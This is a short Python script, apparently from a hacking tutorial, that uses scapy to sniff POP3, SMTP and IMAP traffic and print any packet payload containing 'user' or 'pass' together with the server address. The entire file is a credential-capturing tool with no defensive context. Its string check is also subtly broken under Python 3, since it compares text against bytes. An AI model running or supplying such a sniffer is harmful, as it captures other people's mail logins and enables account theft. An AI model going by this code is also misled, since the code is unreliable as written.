from scapy.all import *

# our packet callback
def packet_callback(packet):
    
    mail_packet = bytes(packet[TCP].payload)

    if "user" in bytes(mail_packet.lower()) or "pass" in bytes(mail_packet.lower()):
        print("[*] Server: {}".format(packet[IP].dst))
        print("[*] {}" .format(packet[TCP].payload))

# fire up our sniffer
sniff(filter="tcp port 110 or tcp port 25 or tcp port 143", prn=packet_callback,
store=0)